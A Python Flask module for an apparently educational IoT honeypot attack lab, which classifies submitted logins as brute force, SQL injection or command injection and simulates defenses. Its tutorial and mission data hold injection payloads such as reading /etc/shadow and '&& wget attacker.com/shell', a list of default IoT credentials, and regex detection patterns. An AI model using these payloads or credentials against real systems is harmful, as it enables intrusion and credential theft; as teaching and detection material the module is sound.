# ============================================================================
# lab_routes.py - Interactive Simulation Lab Module
# ============================================================================
# Updated: Real AbuseIPDB lookups with user-selectable attacker IPs
# ============================================================================

from flask import Blueprint, render_template, request, jsonify
import sqlite3
import json
import random
import re
from datetime import datetime

lab_bp = Blueprint('lab', __name__)

# Module state (initialized by init_lab_module)
_app_config = {}
_current_persona = {}
_attack_sources = []
_get_reputation_score = None
_get_api_key = None

# ============================================================================
# ACTIVE DEFENSE STATE (in-memory, resets on server restart)
# ============================================================================
_lab_defenses = {
    'blocked_ips': [],
    'rate_limit': False,
    'rate_limit_max': 5,
    'rate_limit_counts': {},
    'account_lockout': False,
    'lockout_threshold': 3,
    'lockout_counts': {},
    'locked_accounts': [],
    'waf_enabled': False
}

def init_lab_module(app_config, current_persona, attack_sources, get_reputation_func=None, get_api_key_func=None):
    """Initialize the lab module with references to main app's config."""
    global _app_config, _current_persona, _attack_sources, _get_reputation_score, _get_api_key
    _app_config = app_config
    _current_persona = current_persona
    _attack_sources = attack_sources
    _get_reputation_score = get_reputation_func
    _get_api_key = get_api_key_func


# ============================================================================
# LAB PAGE ROUTE
# ============================================================================

@lab_bp.route('/lab')
@lab_bp.route('/lab/<attack_type>')
def interactive_lab(attack_type=None):
    """Serve the interactive attack lab page."""
    if attack_type is None:
        attack_type = 'brute_force'
    
    valid_attacks = ['brute_force', 'sqli', 'cmdi']
    if attack_type not in valid_attacks:
        attack_type = 'brute_force'
    
    attack_configs = {
        'brute_force': {
            'title': 'Credential Brute Force Lab',
            'mitre_id': 'T1110',
            'tactic': 'Credential Access',
            'color': 'orange',
            'icon': '🔑',
            'description': 'Learn how attackers use default credentials to compromise IoT devices'
        },
        'sqli': {
            'title': 'SQL Injection Lab',
            'mitre_id': 'T1190',
            'tactic': 'Initial Access',
            'color': 'red',
            'icon': '💉',
            'description': 'Understand how SQL injection bypasses authentication systems'
        },
        'cmdi': {
            'title': 'Command Injection Lab',
            'mitre_id': 'T1059',
            'tactic': 'Execution',
            'color': 'purple',
            'icon': '⚡',
            'description': 'Explore how attackers execute system commands through web interfaces'
        }
    }
    
    config = attack_configs.get(attack_type, attack_configs['brute_force'])
    
    return render_template('interactive_lab.html', 
                          active_page='simulation',
                          attack_type=attack_type,
                          attack_config=config,
                          attack_sources=_attack_sources,  # Pass to template for dropdown
                          persona_name=_current_persona.get('name', 'Generic IoT Router'),
                          vendor=_current_persona.get('vendor', 'Generic'))


# ============================================================================
# MISSION MODE ROUTES
# ============================================================================

GOLDEN_PAYLOADS = {
    'brute_force': {'user': 'admin', 'pass': 'admin123', 'min_attempts': 3},
    'sqli':        {'user': "' OR '1'='1", 'pass': '', 'min_attempts': 2},
    'cmdi':        {'user': 'admin', 'pass': '; cat /etc/shadow', 'min_attempts': 2}
}

@lab_bp.route('/lab/mission/recon')
def mission_recon():
    """Phase 1: Reconnaissance terminal."""
    target_ip = _app_config.get('bind_host', '192.168.10.128')
    persona = _current_persona.get('name', 'Generic IoT Router')
    return render_template('mission_recon.html',
                          active_page='simulation',
                          target_ip=target_ip,
                          persona_name=persona)

@lab_bp.route('/lab/mission/weapon')
def mission_weapon():
    """Phase 2: Weaponization - select attack vector + tool command."""
    target_ip = _app_config.get('bind_host', '192.168.10.128')
    return render_template('mission_weapon.html',
                          active_page='simulation',
                          target_ip=target_ip)

@lab_bp.route('/lab/mission/success')
def mission_success():
    """Phase 4: Victory screen."""
    return render_template('mission_success.html',
                          active_page='simulation')


# ============================================================================
# LAB API ENDPOINTS
# ============================================================================

@lab_bp.route('/api/lab/sources')
def get_attack_sources():
    """Return list of available attacker IPs for dropdown."""
    return jsonify(_attack_sources)


@lab_bp.route('/api/lab/capture', methods=['POST'])
def lab_capture():
    """
    Capture and classify attacks from the interactive lab.
    Now checks active defenses before processing.
    """
    data = request.json
    username = data.get('username', '')
    password = data.get('password', '')
    selected_ip = data.get('attacker_ip', '')

    # Determine source IP and country
    if selected_ip:
        source_ip = selected_ip
        source_info = next((s for s in _attack_sources if s['ip'] == selected_ip), None)
        if source_info:
            country = source_info['country']
            country_name = source_info['country_name']
            emoji = source_info['emoji']
        else:
            country = 'Unknown'
            country_name = 'Unknown'
            emoji = '🌐'
    else:
        source = random.choice(_attack_sources) if _attack_sources else {
            'ip': '0.0.0.0', 'country': 'XX', 'country_name': 'Unknown', 'emoji': '🌐'
        }
        source_ip = source['ip']
        country = source['country']
        country_name = source['country_name']
        emoji = source['emoji']

    # ============================
    # CHECK ACTIVE DEFENSES
    # ============================

    # 1. IP Block check
    if source_ip in _lab_defenses['blocked_ips']:
        return jsonify({
            'status': 'blocked',
            'defense': 'ip_block',
            'message': '403 Forbidden - Access Denied',
            'detail': f'IP {source_ip} is on the firewall blocklist.',
            'mitre': 'M1035 - Limit Access to Resource',
            'source': {'ip': source_ip, 'country': country, 'country_name': country_name, 'emoji': emoji}
        })

    # 2. Rate limit check
    if _lab_defenses['rate_limit']:
        counts = _lab_defenses['rate_limit_counts']
        counts[source_ip] = counts.get(source_ip, 0) + 1
        if counts[source_ip] > _lab_defenses['rate_limit_max']:
            return jsonify({
                'status': 'blocked',
                'defense': 'rate_limit',
                'message': '429 Too Many Requests',
                'detail': f'IP {source_ip} exceeded {_lab_defenses["rate_limit_max"]} requests. Throttled.',
                'mitre': 'M1036 - Account Use Policies',
                'attempts': counts[source_ip],
                'limit': _lab_defenses['rate_limit_max'],
                'source': {'ip': source_ip, 'country': country, 'country_name': country_name, 'emoji': emoji}
            })

    # 3. WAF / Signature Filter check
    if _lab_defenses['waf_enabled']:
        waf_result = classify_attack(username, password)
        if waf_result['attack_type'] in ('SQL Injection', 'Command Injection'):
            # WAF detected malicious payload - block it
            matched_field = 'username' if _has_injection(username) else 'password'
            matched_value = username if matched_field == 'username' else password
            return jsonify({
                'status': 'blocked',
                'defense': 'waf',
                'message': '403 Forbidden - Malicious Payload Detected',
                'detail': f'WAF blocked {waf_result["attack_type"]} in {matched_field}: "{matched_value}"',
                'signature': waf_result.get('payload_analysis', ''),
                'mitre': 'M1050 - Exploit Protection',
                'source': {'ip': source_ip, 'country': country, 'country_name': country_name, 'emoji': emoji}
            })

    # 4. Account lockout check
    if _lab_defenses['account_lockout'] and username.lower() in _lab_defenses['locked_accounts']:
        return jsonify({
            'status': 'blocked',
            'defense': 'account_lockout',
            'message': 'Account Locked',
            'detail': f'Account "{username}" has been locked after {_lab_defenses["lockout_threshold"]} failed attempts.',
            'mitre': 'M1032 - Multi-factor Authentication',
            'source': {'ip': source_ip, 'country': country, 'country_name': country_name, 'emoji': emoji}
        })

    # ============================
    # NORMAL CAPTURE (no defense triggered)
    # ============================
    classification = classify_attack(username, password)

    ip_reputation = get_real_ip_reputation(source_ip)
    if ip_reputation.get('country') and ip_reputation['country'] != 'Unknown':
        country = ip_reputation['country']
    real_score = ip_reputation['score']

    attack_id = log_attack_to_db(
        source_ip=source_ip,
        method='POST',
        path='/login',
        payload={'username': username, 'password': password},
        score=real_score,
        attack_type=f"{classification['attack_type']} ({classification['mitre_id']})",
        country=country,
        vendor=_current_persona.get('vendor', 'Generic')
    )

    # Track failed login attempts for account lockout
    if _lab_defenses['account_lockout'] and classification['attack_type'] == 'Brute Force':
        lc = _lab_defenses['lockout_counts']
        uname = username.lower()
        lc[uname] = lc.get(uname, 0) + 1
        if lc[uname] >= _lab_defenses['lockout_threshold'] and uname not in _lab_defenses['locked_accounts']:
            _lab_defenses['locked_accounts'].append(uname)

    # Check golden payload match (for mission mode success)
    req_attack_type = data.get('attack_type', '')
    golden = GOLDEN_PAYLOADS.get(req_attack_type)
    golden_match = False
    if golden and username == golden['user'] and password == golden['pass']:
        golden_match = True

    return jsonify({
        'status': 'captured',
        'attack_id': attack_id,
        'source': {
            'ip': source_ip,
            'country': country,
            'country_name': country_name,
            'emoji': emoji
        },
        'classification': classification,
        'ip_reputation': {
            'score': real_score,
            'country': country,
            'source': ip_reputation['source'],
            'cached': ip_reputation.get('cached', False)
        },
        'logged_at': datetime.now().isoformat(),
        'golden_match': golden_match,
        'defenses_active': {
            'rate_limit': _lab_defenses['rate_limit'],
            'account_lockout': _lab_defenses['account_lockout'],
            'lockout_warning': (
                _lab_defenses['account_lockout'] and
                classification['attack_type'] == 'Brute Force' and
                _lab_defenses['lockout_counts'].get(username.lower(), 0) >= _lab_defenses['lockout_threshold']
            )
        }
    })


@lab_bp.route('/api/lab/check_ip', methods=['POST'])
def check_ip_reputation():
    """
    Check a single IP's reputation (for preview before attack).
    Uses caching to respect API rate limits.
    """
    ip = request.json.get('ip', '').strip()
    if not ip:
        return jsonify({'error': 'No IP provided'}), 400
    
    reputation = get_real_ip_reputation(ip)
    return jsonify(reputation)


@lab_bp.route('/api/lab/clear', methods=['POST'])
def clear_lab_data():
    """Clear all attack logs generated by the Interactive Lab."""
    conn = sqlite3.connect('attacks.db')
    cursor = conn.cursor()
    
    cursor.execute("SELECT COUNT(*) FROM attacks WHERE user_agent = 'Interactive-Lab/1.0'")
    count = cursor.fetchone()[0]
    
    cursor.execute("DELETE FROM attacks WHERE user_agent = 'Interactive-Lab/1.0'")
    conn.commit()
    conn.close()
    
    return jsonify({
        "status": "success",
        "deleted": count,
        "message": f"Cleared {count} lab entries"
    })


# ============================================================================
# ACTIVE DEFENSE ENDPOINTS
# ============================================================================

@lab_bp.route('/api/lab/defenses')
def get_defenses():
    """Get current defense state."""
    return jsonify({
        'blocked_ips': _lab_defenses['blocked_ips'],
        'rate_limit': _lab_defenses['rate_limit'],
        'rate_limit_max': _lab_defenses['rate_limit_max'],
        'account_lockout': _lab_defenses['account_lockout'],
        'lockout_threshold': _lab_defenses['lockout_threshold'],
        'locked_accounts': _lab_defenses['locked_accounts'],
        'rate_limit_counts': _lab_defenses['rate_limit_counts'],
        'waf_enabled': _lab_defenses['waf_enabled']
    })


@lab_bp.route('/api/lab/defend', methods=['POST'])
def activate_defense():
    """Activate or deactivate a defense countermeasure."""
    data = request.json
    action = data.get('action', '')
    
    response = {'status': 'success', 'action': action}
    
    if action == 'block_ip':
        ip = data.get('ip', '')
        if ip and ip not in _lab_defenses['blocked_ips']:
            _lab_defenses['blocked_ips'].append(ip)
            response['message'] = f'IP {ip} blocked'
            response['mitre'] = 'M1035 - Limit Access to Resource'
    
    elif action == 'unblock_ip':
        ip = data.get('ip', '')
        if ip in _lab_defenses['blocked_ips']:
            _lab_defenses['blocked_ips'].remove(ip)
            response['message'] = f'IP {ip} unblocked'
    
    elif action == 'enable_rate_limit':
        _lab_defenses['rate_limit'] = True
        _lab_defenses['rate_limit_max'] = int(data.get('max_requests', 5))
        _lab_defenses['rate_limit_counts'] = {}
        response['message'] = f"Rate limit enabled ({_lab_defenses['rate_limit_max']} req/session)"
        response['mitre'] = 'M1036 - Account Use Policies'
    
    elif action == 'disable_rate_limit':
        _lab_defenses['rate_limit'] = False
        _lab_defenses['rate_limit_counts'] = {}
        response['message'] = 'Rate limit disabled'
    
    elif action == 'enable_lockout':
        _lab_defenses['account_lockout'] = True
        _lab_defenses['lockout_threshold'] = int(data.get('threshold', 3))
        _lab_defenses['lockout_counts'] = {}
        _lab_defenses['locked_accounts'] = []
        response['message'] = f"Account lockout enabled ({_lab_defenses['lockout_threshold']} attempts)"
        response['mitre'] = 'M1032 - Multi-factor Authentication'
    
    elif action == 'disable_lockout':
        _lab_defenses['account_lockout'] = False
        _lab_defenses['lockout_counts'] = {}
        _lab_defenses['locked_accounts'] = []
        response['message'] = 'Account lockout disabled'
    
    elif action == 'enable_waf':
        _lab_defenses['waf_enabled'] = True
        response['message'] = 'WAF signature filter enabled'
        response['mitre'] = 'M1050 - Exploit Protection'
    
    elif action == 'disable_waf':
        _lab_defenses['waf_enabled'] = False
        response['message'] = 'WAF signature filter disabled'
    
    elif action == 'reset_all':
        _lab_defenses['blocked_ips'] = []
        _lab_defenses['rate_limit'] = False
        _lab_defenses['rate_limit_counts'] = {}
        _lab_defenses['account_lockout'] = False
        _lab_defenses['lockout_counts'] = {}
        _lab_defenses['locked_accounts'] = []
        _lab_defenses['waf_enabled'] = False
        response['message'] = 'All defenses reset'
    
    else:
        return jsonify({'status': 'error', 'message': f'Unknown action: {action}'}), 400
    
    response['defenses'] = {
        'blocked_ips': _lab_defenses['blocked_ips'],
        'rate_limit': _lab_defenses['rate_limit'],
        'account_lockout': _lab_defenses['account_lockout'],
        'locked_accounts': _lab_defenses['locked_accounts'],
        'waf_enabled': _lab_defenses['waf_enabled']
    }
    return jsonify(response)


@lab_bp.route('/api/lab/stats')
def lab_stats():
    """Get statistics for interactive lab sessions."""
    conn = sqlite3.connect('attacks.db')
    cursor = conn.cursor()
    
    cursor.execute('''
        SELECT attack_type, COUNT(*) FROM attacks 
        WHERE user_agent = 'Interactive-Lab/1.0'
        GROUP BY attack_type
    ''')
    
    stats = {'total': 0, 'brute_force': 0, 'sqli': 0, 'cmdi': 0}
    
    for row in cursor.fetchall():
        attack_type, count = row
        stats['total'] += count
        if 'Brute Force' in attack_type:
            stats['brute_force'] += count
        elif 'SQL' in attack_type:
            stats['sqli'] += count
        elif 'Command' in attack_type:
            stats['cmdi'] += count
    
    stats['threat_level'] = 'HIGH' if (stats['sqli'] > 0 or stats['cmdi'] > 0) else ('MEDIUM' if stats['brute_force'] > 5 else 'LOW')
    
    conn.close()
    return jsonify(stats)


@lab_bp.route('/api/lab/tutorial')
def get_tutorial():
    """Get tutorial steps for guided mode."""
    attack_type = request.args.get('type', 'brute_force')
    
    tutorials = {
        'brute_force': [
            {'step': 1, 'objective': "Enter admin / admin", 'hint': "Most common IoT default", 'expected_user': 'admin', 'expected_pass': 'admin'},
            {'step': 2, 'objective': "Enter root / root", 'hint': "Linux superuser", 'expected_user': 'root', 'expected_pass': 'root'},
            {'step': 3, 'objective': "Enter admin / (empty)", 'hint': "Some have no password!", 'expected_user': 'admin', 'expected_pass': ''},
            {'step': 4, 'objective': "Enter ubnt / ubnt", 'hint': "Ubiquiti default", 'expected_user': 'ubnt', 'expected_pass': 'ubnt'},
            {'step': 5, 'objective': "🎉 Tutorial Complete!", 'hint': "Try Sandbox mode", 'final': True}
        ],
        'sqli': [
            {'step': 1, 'objective': "Enter ' OR '1'='1 in username", 'hint': "Always-true condition", 'expected_user': "' OR '1'='1", 'expected_pass': ''},
            {'step': 2, 'objective': "Enter admin'-- in username", 'hint': "Comments out password check", 'expected_user': "admin'--", 'expected_pass': ''},
            {'step': 3, 'objective': "Enter ' OR 1=1 -- in username", 'hint': "Another variant", 'expected_user': "' OR 1=1 --", 'expected_pass': ''},
            {'step': 4, 'objective': "🎉 Tutorial Complete!", 'hint': "Try Sandbox mode", 'final': True}
        ],
        'cmdi': [
            {'step': 1, 'objective': "Enter ; ls -la in password", 'hint': "Semicolon chains a second command", 'expected_user': 'admin', 'expected_pass': '; ls -la'},
            {'step': 2, 'objective': "Enter | cat /etc/passwd in password", 'hint': "Pipe sends output to attacker", 'expected_user': 'admin', 'expected_pass': '| cat /etc/passwd'},
            {'step': 3, 'objective': "Enter $(whoami) in username", 'hint': "Command substitution runs inside $()", 'expected_user': '$(whoami)', 'expected_pass': ''},
            {'step': 4, 'objective': "Enter admin && wget attacker.com/shell in password", 'hint': "&& runs second command if first succeeds", 'expected_user': 'admin', 'expected_pass': '&& wget attacker.com/shell'},
            {'step': 5, 'objective': "🎉 Tutorial Complete!", 'hint': "Try Sandbox mode", 'final': True}
        ]
    }
    
    return jsonify(tutorials.get(attack_type, tutorials['brute_force']))


# ============================================================================
# REAL IP REPUTATION LOOKUP
# ============================================================================

def get_real_ip_reputation(ip):
    """
    Get REAL IP reputation from AbuseIPDB with caching.
    This does actual API lookups, not hardcoded scores.
    """
    # Skip private/local IPs
    if ip.startswith('192.168.') or ip.startswith('10.') or ip.startswith('172.16.') or ip == '127.0.0.1':
        return {
            'score': 0,
            'country': 'Local',
            'source': 'Private IP',
            'usage_type': 'Private',
            'cached': False
        }
    
    # Check cache first
    conn = sqlite3.connect('attacks.db')
    cursor = conn.cursor()
    cursor.execute("SELECT abuse_score, country_code, usage_type FROM ip_intelligence WHERE ip_address = ?", (ip,))
    cached = cursor.fetchone()
    
    if cached:
        conn.close()
        return {
            'score': cached[0],
            'country': cached[1],
            'usage_type': cached[2] or 'Unknown',
            'source': 'Cache',
            'cached': True
        }
    
    # Not cached - do real AbuseIPDB lookup
    if _get_api_key and _get_api_key():
        try:
            import requests
            url = 'https://api.abuseipdb.com/api/v2/check'
            headers = {'Accept': 'application/json', 'Key': _get_api_key()}
            params = {'ipAddress': ip, 'maxAgeInDays': '90'}
            
            response = requests.get(url, headers=headers, params=params, timeout=5)
            data = response.json()
            
            if 'data' in data:
                score = data['data']['abuseConfidenceScore']
                country = data['data'].get('countryCode', 'Unknown')
                usage = data['data'].get('usageType', 'Unknown')

                # Detect Tor exit nodes
                if data['data'].get('isTor', False):
                    usage = 'Tor Exit Node'
                
                # Cache the result
                cursor.execute('''
                    INSERT OR REPLACE INTO ip_intelligence (ip_address, abuse_score, country_code, last_updated, usage_type)
                    VALUES (?, ?, ?, ?, ?)
                ''', (ip, score, country, datetime.now().isoformat(), usage))
                conn.commit()
                conn.close()
                
                return {
                    'score': score,
                    'country': country,
                    'usage_type': usage,
                    'source': 'AbuseIPDB',
                    'cached': False
                }
        except Exception as e:
            print(f"[LAB] AbuseIPDB lookup failed for {ip}: {e}")
    
    conn.close()
    
    # Fallback if no API key or lookup failed
    return {
        'score': 0,
        'country': 'Unknown',
        'usage_type': 'Unknown',
        'source': 'No API Key',
        'cached': False
    }


# ============================================================================
# ATTACK CLASSIFICATION
# ============================================================================

def _has_injection(value):
    """Quick check if a string contains SQLi or CmdI patterns (used by WAF to identify which field triggered)."""
    injection_patterns = [
        r"['\"](\s*)(OR|AND|;|--|UNION)",  # SQLi quotes
        r'\b(SELECT|INSERT|UPDATE|DELETE|DROP|UNION)\b',  # SQL keywords
        r"(OR|AND)\s*['\"]?\w*['\"]?\s*=\s*['\"]?\w*['\"]?",  # Tautology
        r'(--|/\*|\*/|#)',  # SQL comments
        r'\$\(',  # CmdI substitution
        r'`[^`]+`',  # Backtick
        r'\|\s*\w',  # Pipe
        r';\s*\w',  # Chaining
        r'&&\s*\w',  # AND chain
        r'\|\|\s*\w',  # OR chain
    ]
    for pat in injection_patterns:
        if re.search(pat, value, re.IGNORECASE):
            return True
    return False


def classify_attack(username, password):
    """
    Classify attack based on input patterns using regex.
    Improved version with better SQLi detection.
    """
    combined = f"{username} {password}"
    
    # ========================================
    # SQL INJECTION DETECTION (Regex-based)
    # ========================================
    sqli_score = 0
    sqli_indicators = []
    
    # Pattern 1: SQL Keywords (SELECT, UNION, INSERT, etc.)
    sql_keywords = r'\b(SELECT|INSERT|UPDATE|DELETE|DROP|UNION|FROM|WHERE|HAVING|GROUP BY|ORDER BY|EXEC|EXECUTE|EVAL)\b'
    if re.search(sql_keywords, combined, re.IGNORECASE):
        sqli_score += 2
        sqli_indicators.append("SQL keywords")
    
    # Pattern 2: SQL Comments (-- or /* or #)
    sql_comments = r'(--|/\*|\*/|#)'
    if re.search(sql_comments, combined):
        sqli_score += 2
        sqli_indicators.append("SQL comments")
    
    # Pattern 3: SQL Functions (CONVERT, CAST, SLEEP, BENCHMARK, etc.)
    sql_functions = r'\b(CONVERT|CAST|CONCAT|SUBSTRING|ASCII|CHAR|HEX|UNHEX|SLEEP|BENCHMARK|WAITFOR|@@VERSION|@@SERVERNAME|LOAD_FILE|INTO OUTFILE)\b'
    if re.search(sql_functions, combined, re.IGNORECASE):
        sqli_score += 2
        sqli_indicators.append("SQL functions")
    
    # Pattern 4: Tautology (OR 1=1, OR 'a'='a', etc.)
    tautology = r"(OR|AND)\s*['\"]?\w*['\"]?\s*=\s*['\"]?\w*['\"]?"
    if re.search(tautology, combined, re.IGNORECASE):
        sqli_score += 2
        sqli_indicators.append("Tautology")
    
    # Pattern 5: Quote characters with operators
    quote_abuse = r"['\"](\s*)(OR|AND|;|--|UNION)"
    if re.search(quote_abuse, combined, re.IGNORECASE):
        sqli_score += 1
        sqli_indicators.append("Quote manipulation")
    
    # Pattern 6: Stacked queries (;)
    if ';' in combined and re.search(r';\s*\w', combined):
        sqli_score += 1
        sqli_indicators.append("Stacked queries")
    
    # If SQLi score >= 2, classify as SQL Injection
    if sqli_score >= 2:
        subtype = ", ".join(sqli_indicators[:2])  # Show first 2 indicators
        return {
            'attack_type': 'SQL Injection',
            'mitre_id': 'T1190',
            'tactic': 'Initial Access',
            'technique': 'Exploit Public-Facing Application',
            'subtype': subtype,
            'threat_level': 'HIGH',
            'explanation': f"SQL Injection detected ({subtype}). The payload contains SQL syntax that could manipulate database queries.",
            'defense_tips': ["Use parameterized queries", "Input validation", "Least privilege DB accounts", "Web Application Firewall"],
            'payload_analysis': f"Payload: {username} / {password or '(empty)'}"
        }
    
    # ========================================
    # COMMAND INJECTION DETECTION
    # ========================================
    cmdi_patterns = [
        (r'\$\(', "Command substitution $()"),
        (r'`[^`]+`', "Backtick execution"),
        (r'\|\s*\w', "Pipe injection"),
        (r';\s*\w', "Command chaining"),
        (r'&&\s*\w', "AND chaining"),
        (r'\|\|\s*\w', "OR chaining"),
    ]
    
    for pattern, subtype in cmdi_patterns:
        if re.search(pattern, combined):
            return {
                'attack_type': 'Command Injection',
                'mitre_id': 'T1059',
                'tactic': 'Execution',
                'technique': 'Command Interpreter',
                'subtype': subtype,
                'threat_level': 'CRITICAL',
                'explanation': f"Command Injection ({subtype}). User input is being passed to shell without sanitization.",
                'defense_tips': ["Never pass input to shell", "Use parameterized APIs", "Input whitelisting", "Minimal privileges"],
                'payload_analysis': f"Payload: {username} / {password or '(empty)'}"
            }
    
    # ========================================
    # BRUTE FORCE (Default)
    # ========================================
    is_default = is_default_credential(username, password)
    return {
        'attack_type': 'Brute Force',
        'mitre_id': 'T1110',
        'tactic': 'Credential Access',
        'technique': 'Credential Stuffing' if is_default else 'Password Guessing',
        'subtype': 'Default credential' if is_default else 'Guessing',
        'threat_level': 'MEDIUM' if is_default else 'LOW',
        'explanation': "Default credential attempt. IoT devices ship with documented defaults. Mirai infected 600K+ devices with just 62 passwords." if is_default else "Password guessing attack.",
        'defense_tips': ["Change defaults immediately", "Strong passwords (12+ chars)", "Rate limiting", "Account lockout", "MFA"],
        'payload_analysis': f"Credentials: {username}/{password or '(empty)'}"
    }


def is_default_credential(username, password):
    """Check if credential matches known IoT defaults."""
    defaults = [
        ('admin', 'admin'), ('admin', 'password'), ('admin', '1234'),
        ('admin', ''), ('root', 'root'), ('root', ''),
        ('user', 'user'), ('guest', 'guest'), ('ubnt', 'ubnt'),
        ('support', 'support'), ('admin', '12345'), ('admin', 'admin123'),
    ]
    return (username.lower(), password.lower()) in defaults or (username.lower(), password) in defaults


# ============================================================================
# DATABASE LOGGING
# ============================================================================

def log_attack_to_db(source_ip, method, path, payload, score, attack_type, country, vendor):
    """Log attack to database."""
    conn = sqlite3.connect('attacks.db')
    cursor = conn.cursor()
    cursor.execute('''
        INSERT INTO attacks 
        (timestamp, source_ip, http_method, url_path, payload, user_agent, abuse_score, attack_type, country_code, manufacturer, source)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    ''', (
        datetime.now().strftime('%Y-%m-%d %H:%M:%S'), source_ip, method, path,
        json.dumps(payload), 'Interactive-Lab/1.0', score, attack_type, country, vendor, 'simulation'
    ))
    conn.commit()
    attack_id = cursor.lastrowid
    conn.close()
    return attack_id